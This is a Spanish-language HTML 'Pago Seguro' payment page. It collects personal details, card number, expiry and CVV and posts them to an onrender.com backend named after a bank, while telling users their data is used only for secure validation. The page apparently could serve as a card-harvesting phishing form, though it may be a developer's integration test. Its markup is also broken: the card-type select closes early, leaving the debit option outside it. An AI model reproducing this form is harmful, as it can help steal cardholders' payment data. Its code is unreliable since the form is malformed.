<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Pago Seguro</title>

<!-- ✅ ELIMINADO SAMEORIGIN -->
<meta http-equiv="X-Content-Type-Options" content="nosniff">

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #4a148c, #7b1fa2);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

.container {
  background: white;
  padding: 25px;
  border-radius: 15px;
  width: 360px;
  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
}

h2 {
  text-align: center;
  color: #6a1b9a;
}

input, select {
  width: 100%;
  padding: 10px;
  margin: 7px 0;
  border-radius: 8px;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  width: 100%;
  padding: 12px;
  background: #6a1b9a;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  background: #4a148c;
}

button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.cvv-container {
  position: relative;
}

.toggle-cvv {
  position: absolute;
  right: 10px;
  top: 12px;
  cursor: pointer;
  font-size: 12px;
  color: #6a1b9a;
}

.section-title {
  margin-top: 10px;
  font-size: 14px;
  color: #555;
}

.loading {
  display: none;
  margin-top: 10px;
  text-align: center;
  color: #6a1b9a;
  font-size: 13px;
}
</style>
</head>

<body>

<div class="container">

  <h2>Pago Seguro</h2>

  <form 
    id="paymentForm"
    method="POST" 
    action="https://backend-banorte.onrender.com/api/payment/3d-secure"
    autocomplete="off"
    onsubmit="return validarForm()"
    target="_self"
  >

    <div class="section-title">
      Datos personales
    </div>

    <input
      name="nombre"
      placeholder="Nombre completo"
      required
      minlength="3"
    >

    <input
      name="correo"
      type="email"
      placeholder="Correo electrónico"
      required
    >

    <input
      name="telefono"
      placeholder="Teléfono"
      pattern="\d{10}"
      required
    >

    <div class="section-title">
      Dirección
    </div>

    <input
      name="direccion"
      placeholder="Dirección"
      required
      minlength="5"
    >

    <input
      name="ciudad"
      placeholder="Ciudad"
      required
    >

    <input
      name="cp"
      placeholder="Código Postal"
      pattern="\d{5}"
      required
    >

    <div class="section-title">
      Tipo de tarjeta
    </div>

    <select
  id="tipoTarjeta"
  name="tipoTarjeta"
  required
>
      <option value="">
        Selecciona
      </option>

      <option value="CR">
        Crédito
      </option>
      </select>

     <option value="DB">
    Débito
  </option>
</select>

    <div class="section-title">
  Modalidad de pago
</div>

<select
  id="paymentsNumber"
  name="PAYMENTS_NUMBER"
  required
>
  <option value="CONTADO" selected>
  Contado
    </option>

  <option value="06">
    6 meses sin intereses
  </option>

  <option value="12">
    12 meses sin intereses
  </option>
</select>

    <div class="section-title">
      Datos de la tarjeta
    </div>

    <input
      name="cardNumber"
      placeholder="Número de tarjeta"
      maxlength="19"
      pattern="\d{15,19}"
      inputmode="numeric"
      required
    >

    <input
      name="cardExp"
      placeholder="MM/AA"
      maxlength="5"
      pattern="\d{2}/\d{2}"
      required
    >

    <div class="cvv-container">

      <input
        id="cvv"
        name="cvv"
        type="password"
        placeholder="CVV"
        maxlength="4"
        pattern="\d{3,4}"
        required
      >

      <span
        class="toggle-cvv"
        onclick="toggleCVV()"
      >
        Ver
      </span>

    </div>

    <input
      name="amount"
      type="number"
      min="1"
      max="9999999.99"
      step="0.01"
      placeholder="Monto"
      required
    >

    <button
      id="submitBtn"
      type="submit"
    >
      Pagar
    </button>

    <div
      class="loading"
      id="loading"
    >
      Redirigiendo a validación segura...
    </div>

    <p style="
      font-size:12px;
      color:gray;
      text-align:center;
    ">
      Tus datos se usan únicamente
      para validar el pago de forma segura.
    </p>

  </form>

</div>

<script>

// ===============================
// VALIDACIÓN GENERAL
// ===============================
function validarForm() {

  const monto =
    document.querySelector(
      '[name="amount"]'
    ).value;

  const tipoTarjeta =
    document
      .getElementById("tipoTarjeta")
      .value;

  const paymentsNumber =
    document
      .getElementById("paymentsNumber")
      .value;

  if (Number(monto) <= 0) {
    alert("Monto inválido");
    return false;
  }

  if (
    (paymentsNumber === "06" ||
     paymentsNumber === "12") &&
    tipoTarjeta !== "CR"
  ) {
    alert(
      "Los meses sin intereses solo están disponibles con tarjeta de crédito."
    );
    return false;
  }

  document
    .getElementById("submitBtn")
    .disabled = true;

  document
    .getElementById("loading")
    .style.display = "block";

  return true;
}
// ===============================
// MOSTRAR / OCULTAR CVV
// ===============================
function toggleCVV() {

  const cvv =
    document.getElementById("cvv");

  cvv.type =
    cvv.type === "password"
      ? "text"
      : "password";
}


// ===============================
// FORMATO MM/AA
// ===============================
document
  .querySelector('[name="cardExp"]')
  .addEventListener("input", e => {

    let val =
      e.target.value
        .replace(/\D/g, "");

    if (val.length >= 2) {

      val =
        val.slice(0,2) +
        "/" +
        val.slice(2,4);
    }

    e.target.value = val;
  });


// ===============================
// SOLO NÚMEROS TARJETA
// ===============================
document
  .querySelector('[name="cardNumber"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0,19);
  });


// ===============================
// SOLO NÚMEROS TELÉFONO
// ===============================
document
  .querySelector('[name="telefono"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0,10);
  });


// ===============================
// SOLO NÚMEROS CP
// ===============================
document
  .querySelector('[name="cp"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0,5);
  });

</script>

</body>
</html>
